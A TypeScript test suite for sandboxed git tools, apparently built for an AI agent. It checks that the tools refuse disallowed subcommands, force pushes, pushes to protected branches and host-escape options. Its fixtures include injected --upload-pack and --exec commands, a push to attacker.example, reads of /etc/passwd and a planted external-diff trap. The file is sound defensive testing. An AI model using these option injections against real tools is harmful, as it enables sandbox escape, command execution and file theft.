import { chmod, mkdtemp, writeFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { execFile } from "node:child_process";
import { promisify } from "node:util";
import { GitReadTool, GitTool } from "../../src/tools/git-tools.js";

const exec = promisify(execFile);

describe("GitTool", () => {
  it("runs an allowlisted subcommand and returns stdout", async () => {
    const dir = await mkdtemp(join(tmpdir(), "ws-"));
    await exec("git", ["init"], { cwd: dir });
    await exec("git", ["config", "user.email", "test@example.com"], { cwd: dir });
    await exec("git", ["config", "user.name", "Test"], { cwd: dir });
    const tool = new GitTool(dir);

    const result = await tool.call({ args: ["status", "--porcelain"] });

    expect(result.exitCode).toBe(0);
  });

  it("rejects a subcommand not on the allowlist", async () => {
    const dir = await mkdtemp(join(tmpdir(), "ws-"));
    const tool = new GitTool(dir);

    const result = await tool.call({ args: ["rebase", "main"] });

    expect(result.error).toBe("DisallowedGitCommandError");
  });

  it("rejects pushing directly to protected branch main", async () => {
    const dir = await mkdtemp(join(tmpdir(), "ws-"));
    const tool = new GitTool(dir);

    const result = await tool.call({ args: ["push", "origin", "main"] });

    expect(result.error).toBe("DisallowedGitCommandError");
    expect(result.message).toContain("protected branches");
  });

  it("rejects push with force flag", async () => {
    const dir = await mkdtemp(join(tmpdir(), "ws-"));
    const tool = new GitTool(dir);

    const result = await tool.call({ args: ["push", "--force", "origin", "feature"] });

    expect(result.error).toBe("DisallowedGitCommandError");
    expect(result.message).toContain("flags in");
  });

  it("rejects reset --hard even though reset alone might seem safe", async () => {
    const dir = await mkdtemp(join(tmpdir(), "ws-"));
    const tool = new GitTool(dir);

    const result = await tool.call({ args: ["reset", "--hard", "HEAD~1"] });

    expect(result.error).toBe("DisallowedGitCommandError");
  });

  describe("host-escape options", () => {
    async function repo(): Promise<string> {
      const dir = await mkdtemp(join(tmpdir(), "ws-"));
      await exec("git", ["init", "-q", "-b", "feature"], { cwd: dir });
      await exec("git", ["config", "user.email", "test@example.com"], { cwd: dir });
      await exec("git", ["config", "user.name", "Test"], { cwd: dir });
      await writeFile(join(dir, "a.txt"), "a\n");
      await exec("git", ["add", "a.txt"], { cwd: dir });
      await exec("git", ["commit", "-q", "-m", "init"], { cwd: dir });
      return dir;
    }

    it.each([
      [["diff", "--output=/tmp/nexum-git-escape.txt"]],
      [["log", "--out=/tmp/nexum-git-escape.txt"]],
      [["pull", "--upload-pack=touch /tmp/nexum-pwned", "origin"]],
      [["push", "--receive-pack=touch /tmp/nexum-pwned", "origin", "feature"]],
      [["push", "--exec=touch /tmp/nexum-pwned", "origin", "feature"]],
      [["push", "--repo=https://attacker.example/x.git", "feature"]],
      [["diff", "--no-index", "/dev/null", "/etc/passwd"]],
      [["blame", "--contents", "/etc/passwd", "--", "a.txt"]],
      [["blame", "-S", "/etc/passwd", "a.txt"]],
      [["commit", "-F", "/etc/passwd"]],
      [["commit", "--file=/etc/passwd"]],
      [["commit", "-aF", "/etc/passwd"]],
      [["commit", "--template=/etc/passwd"]],
      [["add", "--pathspec-from-file=/etc/passwd"]],
      [["show", "-O/etc/passwd"]],
    ])("blocks %j", async (args) => {
      const dir = await repo();
      const result = await new GitTool(dir).call({ args });
      expect(result.error).toBe("DisallowedGitCommandError");
    });

    it("never writes the --output file", async () => {
      const dir = await repo();
      const target = join(dir, "..", `escape-${Date.now()}.txt`);
      await new GitTool(dir).call({ args: ["diff", `--output=${target}`] });
      expect(existsSync(target)).toBe(false);
    });

    it("blocks pushes to URLs, paths and unknown remotes, and refspecs onto protected branches", async () => {
      const dir = await repo();
      const tool = new GitTool(dir);
      for (const remote of ["https://attacker.example/x.git", "/tmp/other-repo", "../sibling", "nope"]) {
        const result = await tool.call({ args: ["push", remote, "feature"] });
        expect(result.error).toBe("DisallowedGitCommandError");
      }
      const refspec = await tool.call({ args: ["push", "origin", "HEAD:main"] });
      expect(refspec.message).toContain("protected branches");
    });

    it("still allows everyday commands and pushes to a configured remote", async () => {
      const dir = await repo();
      const bare = await mkdtemp(join(tmpdir(), "bare-"));
      await exec("git", ["init", "-q", "--bare", bare]);
      await exec("git", ["remote", "add", "origin", bare], { cwd: dir });
      const tool = new GitTool(dir);
      await writeFile(join(dir, "a.txt"), "b\n");
      expect((await tool.call({ args: ["diff", "--stat"] })).exitCode).toBe(0);
      expect((await tool.call({ args: ["commit", "-am", "update"] })).exitCode).toBe(0);
      expect((await tool.call({ args: ["log", "--oneline", "-n", "1"] })).exitCode).toBe(0);
      // option values are not mistaken for the remote (the bare repo itself rejects push options)
      expect((await tool.call({ args: ["push", "-o", "ci.skip", "origin", "feature"] })).error).toBeUndefined();
      const push = await tool.call({ args: ["push", "origin", "feature"] });
      expect(push.error).toBeUndefined();
      expect(push.exitCode).toBe(0);
    });
  });
});

describe("GitReadTool", () => {
  async function repoWithOneCommit(): Promise<string> {
    const dir = await mkdtemp(join(tmpdir(), "ws-"));
    for (const args of [["init"], ["config", "user.email", "t@example.com"], ["config", "user.name", "T"]]) {
      await exec("git", args, { cwd: dir });
    }
    await writeFile(join(dir, "a.txt"), "one\n");
    await exec("git", ["add", "a.txt"], { cwd: dir });
    await exec("git", ["commit", "-m", "first"], { cwd: dir });
    return dir;
  }

  it("should report status, log and diff", async () => {
    const dir = await repoWithOneCommit();
    await writeFile(join(dir, "a.txt"), "two\n");
    const tool = new GitReadTool(dir);

    const status = await tool.call({ args: ["status", "--porcelain"] });
    const log = await tool.call({ args: ["log", "--oneline"] });
    const diff = await tool.call({ args: ["diff"] });

    expect(status.stdout).toContain("a.txt");
    expect(log.stdout).toContain("first");
    expect(diff.stdout).toContain("+two");
  });

  it.each([
    ["add", "a.txt"],
    ["commit", "-m", "x"],
    ["branch", "feature"],
    ["checkout", "-b", "x"],
    ["push", "origin", "x"],
  ])("should refuse the state-changing subcommand git %s", async (...args) => {
    const dir = await repoWithOneCommit();

    const result = await new GitReadTool(dir).call({ args });

    expect(result.error).toBe("DisallowedGitCommandError");
  });

  it.each([
    ["diff", "--ext-diff"],
    ["show", "--textconv"],
    ["log", "-O"],
    ["diff", "--open-files-in-pager=sh"],
  ])("should refuse the program-running flag in git %s", async (...args) => {
    const dir = await repoWithOneCommit();

    const result = await new GitReadTool(dir).call({ args });

    expect(result.error).toBe("DisallowedGitCommandError");
  });

  it.each([["--ext"], ["--ext-d"], ["--ext-diff"]])(
    "should not run the configured diff program even when the caller passes %s",
    async (flag) => {
      const dir = await repoWithOneCommit();
      const marker = join(dir, "pwned.marker");
      const script = join(dir, "external-diff.sh");
      await writeFile(script, `#!/bin/sh\ntouch "${marker}"\n`);
      await chmod(script, 0o755);
      await exec("git", ["config", "diff.external", script], { cwd: dir });
      await writeFile(join(dir, "a.txt"), "changed\n");

      await new GitReadTool(dir).call({ args: ["diff", flag, "--", "a.txt"] });

      expect(existsSync(marker)).toBe(false);
    },
  );

  it("should not run a program that repo-local config attaches to diff output", async () => {
    const dir = await repoWithOneCommit();
    const marker = join(dir, "pwned.marker");
    const script = join(dir, "external-diff.sh");
    await writeFile(script, `#!/bin/sh\ntouch "${marker}"\n`);
    await chmod(script, 0o755);
    await exec("git", ["config", "diff.external", script], { cwd: dir });
    await writeFile(join(dir, "a.txt"), "changed\n");

    await new GitTool(dir).call({ args: ["diff"] });
    const controlRan = existsSync(marker);
    await exec("rm", [marker]).catch(() => undefined);
    await new GitReadTool(dir).call({ args: ["diff"] });

    expect(controlRan).toBe(true); // the plain git tool does run it, so this setup is a real trap
    expect(existsSync(marker)).toBe(false);
  });
});
